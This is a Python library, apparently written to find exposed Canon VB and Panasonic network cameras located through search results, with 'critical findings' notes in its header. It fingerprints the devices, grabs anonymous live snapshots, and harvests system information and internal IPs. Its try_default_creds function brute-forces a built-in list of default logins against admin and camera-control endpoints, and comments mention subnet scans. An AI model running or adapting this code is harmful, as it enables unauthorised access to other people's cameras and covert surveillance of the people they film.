"""Canon VB / VBViewer / WV-HTTP probe library (CRITICAL FINDINGS 2026-08-23).

Key discoveries from probing user-supplied Google results:
- Cams respond to "Server: VB" header + <title>Network Camera</title>
- Main viewer at /viewer/live/index.html (28811 bytes)
- Streaming protocol is WV-HTTP at /-wvhttp-01-/ (Canon WebView Livescope)
- ANONYMOUS JPEG snapshots at /-wvhttp-01-/getoneshot?image=img (no auth!)
- System info at /-wvhttp-01-/GetSystemInfo returns version=VB-M42 Ver. 1.0.0
- Models: VB-M42, VB-S900F (Canon network cameras - VBViewer is Canon, not Panasonic)
- Models map: BB-HCM/BL-C = Panasonic, VB-M/VB-S/VB-R/VB-H/VB-C = Canon
"""

import requests
import urllib3
import re
import socket
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROBE_TIMEOUT = 8
PROBE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


# WV-HTTP endpoints (Canon WebView Livescope) - the actual working ones
WVHTTP_ANON_PATHS = [
    ("/-wvhttp-01-/getoneshot?image=img", "WV-HTTP-JPEG-Default", "image/jpeg"),
    ("/-wvhttp-01-/getoneshot?image=img&size=320x240", "WV-HTTP-JPEG-320x240", "image/jpeg"),
    ("/-wvhttp-01-/getoneshot?image=img&size=640x480", "WV-HTTP-JPEG-640x480", "image/jpeg"),
    ("/-wvhttp-01-/getoneshot?image=img&size=1280x720", "WV-HTTP-JPEG-1280x720", "image/jpeg"),
    ("/-wvhttp-01-/getoneshot?image=img&size=1280x960", "WV-HTTP-JPEG-1280x960", "image/jpeg"),
    ("/-wvhttp-01-/getoneshot?image=img&size=1920x1080", "WV-HTTP-JPEG-1920x1080", "image/jpeg"),
]

WVHTTP_INFO_ENDPOINTS = [
    "/-wvhttp-01-/GetSystemInfo",
    "/-wvhttp-01-/GetCamInfo",
    "/-wvhttp-01-/GetDate",
    "/-wvhttp-01-/open.cgi?seq=1",
]

# Canonical viewer page (anonymous)
VBVIEWER_VIEWER_PATHS = [
    ("/viewer/live/index.html?lang=en", "VBViewer-Viewer"),
    ("/viewer/live/", "VBViewer-Viewer-Alt"),
    ("/viewer/live/index.html", "VBViewer-Viewer-NoLang"),
]

# Admin/auth endpoints (need creds)
VBVIEWER_AUTH_PATHS = [
    "/admin/index.html",
    "/admintools/index.html",
    "/viewer/admin/index.html",
    "/cgi-bin/aw_cam",
    "/cgi-bin/aw_ptz",
    "/cgi-bin/cam",
    "/cgi-bin/caminfo",
    "/cgi-bin/camctl",
    "/cgi-bin/camdata.cgi",
    "/cgi-bin/camgetimage.cgi",
]

# Canon VB-M / VB-S default credentials
CANON_VB_DEFAULT_CREDS = [
    ("root", ""),  # Canon VB cams: root account with no password initially
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "canon"),
    ("root", "root"),
    ("root", "canon"),
    ("root", "VB"),
    ("admin", "VB"),
    ("admin", "camera"),
    ("operator", "operator"),
    ("viewer", ""),
    ("viewer", "viewer"),
]

# Legacy BB-HCM / BL-C (Panasonic) creds still worth trying
PANASONIC_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "panasonic"),
    ("admin1", ""),
    ("admin1", "12345"),
    ("admin2", ""),
    ("setup", ""),
    ("root", "root"),
]

ALL_DEFAULT_CREDS = CANON_VB_DEFAULT_CREDS + PANASONIC_DEFAULT_CREDS


# Signatures that identify VB cams
VB_CAM_SIGNATURES = [
    r"Server:\s*VB\b",
    r"VB-M\d+",
    r"VB-S\d+",
    r"VB-R\d+",
    r"VB-H\d+",
    r"VB-C\d+",
    r"WebView Livescope",
    r"/-wvhttp-01-/",
    r"BB-HCM\s*\d+",
    r"BL-C\d+",
    r"BB-SMG",
    r"BB-HGW",
    r"Panasonic Network Camera",
    r"i-PRO.*WV-",
]


def is_vbviewer_signature(text, server=""):
    """Return True if text/server contains VB cam signature."""
    blob = (text or "") + " " + (server or "")
    for p in VB_CAM_SIGNATURES:
        if re.search(p, blob, re.I):
            return True
    if "<title>Network Camera</title>" in text:
        return True
    return False


def probe_vb_cam(host, port=80, use_https=False, timeout=PROBE_TIMEOUT):
    """Probe a host for Canon VB / Panasonic / WV-HTTP cam. Returns comprehensive findings."""
    scheme = "https" if use_https else "http"
    base = f"{scheme}://{host}:{port}"
    s = requests.Session()
    s.headers.update({"User-Agent": PROBE_USER_AGENT})
    s.verify = False
    s.timeout = timeout

    findings = {
        "host": host,
        "port": port,
        "scheme": scheme,
        "is_vb_cam": False,
        "anon_streams": [],
        "auth_required": [],
        "system_info": {},
        "viewer_page": None,
        "server_header": "",
        "title": "",
        "version": "",
        "model": "",
        "internal_ip": "",
        "uptime_clients": "",
    }

    try:
        r = s.get(base + "/", timeout=timeout, allow_redirects=True)
        findings["server_header"] = r.headers.get("Server", "")
        findings["title"] = re.search(r"<title>([^<]+)</title>", r.text, re.I).group(1).strip() if re.search(r"<title>([^<]+)</title>", r.text, re.I) else ""
        if is_vbviewer_signature(r.text, findings["server_header"]):
            findings["is_vb_cam"] = True
    except Exception:
        return findings  # Dead host, skip everything else

    # Skip remaining probes if not a VB cam (saves time on subnet scans)
    if not findings["is_vb_cam"]:
        return findings

    # Check viewer page (anonymous)
    for path, label in VBVIEWER_VIEWER_PATHS:
        try:
            r = s.get(base + path, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 1000:
                findings["viewer_page"] = {"path": path, "label": label, "size": len(r.text)}
                findings["is_vb_cam"] = True
                break
        except Exception:
            continue

    # Try WV-HTTP anonymous snapshot (PRIORITY: this is the fast path)
    for path, label, expected_ct in WVHTTP_ANON_PATHS[:2]:  # Only try 2 fastest paths
        try:
            r = s.get(base + path, timeout=timeout, allow_redirects=False)
            ct = r.headers.get("Content-Type", "").lower()
            if r.status_code == 200:
                is_img = b'\xff\xd8\xff' in r.content[:20] or b'GIF8' in r.content[:10] or b'\x89PNG' in r.content[:10]
                if is_img and ('image' in ct or 'jpeg' in ct or len(r.content) > 500):
                    findings["anon_streams"].append({
                        "url": base + path,
                        "path": path,
                        "label": label,
                        "content_type": ct,
                        "size": len(r.content),
                        "is_image": True,
                    })
                    break  # One anon stream is enough
        except Exception:
            continue

    # Get system info (anonymous) - only the version endpoint
    try:
        r = s.get(base + "/-wvhttp-01-/GetSystemInfo", timeout=timeout, allow_redirects=False)
        if r.status_code == 200 and ('=' in r.text):
            findings["system_info"]["/-wvhttp-01-/GetSystemInfo"] = r.text
            for line in r.text.split('\n'):
                line = line.strip()
                if line.startswith('version='):
                    findings["version"] = line.split('=', 1)[1].strip()
                    m = re.search(r"(VB-[A-Z]\d+[A-Z]*)", line)
                    if m:
                        findings["model"] = m.group(1)
                    elif "BB-HCM" in line:
                        findings["model"] = re.search(r"(BB-HCM\d+)", line).group(1)
                    elif "BL-C" in line:
                        findings["model"] = re.search(r"(BL-C\d+)", line).group(1)
                if line.startswith('s.origin:'):
                    findings["internal_ip"] = line.split(':', 1)[1].strip()
                if line.startswith('start_time=') or 'active_clients' in line:
                    findings["uptime_clients"] = line
    except Exception:
        pass

    # Check auth endpoints - skip in subnet scan mode, only check 1 path
    try:
        r = s.get(base + "/admin/index.html", timeout=timeout, allow_redirects=False)
        if r.status_code == 401:
            findings["auth_required"].append({"path": "/admin/index.html", "auth_type": r.headers.get("WWW-Authenticate", "")[:50]})
    except Exception:
        pass

    return findings


def try_default_creds(host, port=80, use_https=False, paths=None, creds=None, timeout=5):
    """Try default creds against VB cam endpoints."""
    if paths is None:
        paths = [
            "/-wvhttp-01-/CamCtrl?Mode=Snapshot",
            "/-wvhttp-01-/CamCtrl?Mode=HomePosition",
            "/cgi-bin/aw_cam",
            "/admin/index.html",
        ]
    if creds is None:
        creds = ALL_DEFAULT_CREDS
    scheme = "https" if use_https else "http"
    base = f"{scheme}://{host}:{port}"
    s = requests.Session()
    s.headers.update({"User-Agent": PROBE_USER_AGENT})
    s.verify = False
    s.timeout = timeout
    found = []
    for path in paths:
        for user, pw in creds:
            try:
                r = s.get(base + path, auth=(user, pw), timeout=timeout, allow_redirects=False)
                # For WV-HTTP: error returns 78 bytes, success returns different content
                if r.status_code == 200:
                    # Check it's not the standard "error" response
                    if "WebView Livescope Http Server Error" not in r.text and "Unknown Operator" not in r.text:
                        if r.status_code != 401 and r.status_code != 403:
                            if "401" not in r.text[:100] and "Authorization" not in r.headers.get("WWW-Authenticate", ""):
                                found.append({
                                    "host": host,
                                    "port": port,
                                    "path": path,
                                    "user": user,
                                    "pass": pw,
                                    "status": r.status_code,
                                    "size": len(r.text),
                                })
                                return found
            except Exception:
                continue
    return found


def detect_model_vb(text, version=""):
    """Detect specific VB cam model from version, URL, or HTML body."""
    model = ""
    blob = (text or "") + " " + (version or "")
    patterns = [
        (r"VB-M(\d+[A-Z]*)", "Canon VB-M"),
        (r"VB-S(\d+[A-Z]*)", "Canon VB-S"),
        (r"VB-R(\d+[A-Z]*)", "Canon VB-R"),
        (r"VB-H(\d+[A-Z]*)", "Canon VB-H"),
        (r"VB-C(\d+[A-Z]*)", "Canon VB-C"),
        (r"BB-HCM\s*(\d+)", "Panasonic BB-HCM"),
        (r"BL-C\s*(\d+)", "Panasonic BL-C"),
        (r"BB-SMG(\d+)", "Panasonic BB-SMG"),
        (r"BB-HGW(\d+)", "Panasonic BB-HGW"),
    ]
    for pat, prefix in patterns:
        m = re.search(pat, blob, re.I)
        if m:
            model = f"{prefix}{m.group(1)}"
            break
    return model or "Canon VB (unknown)"
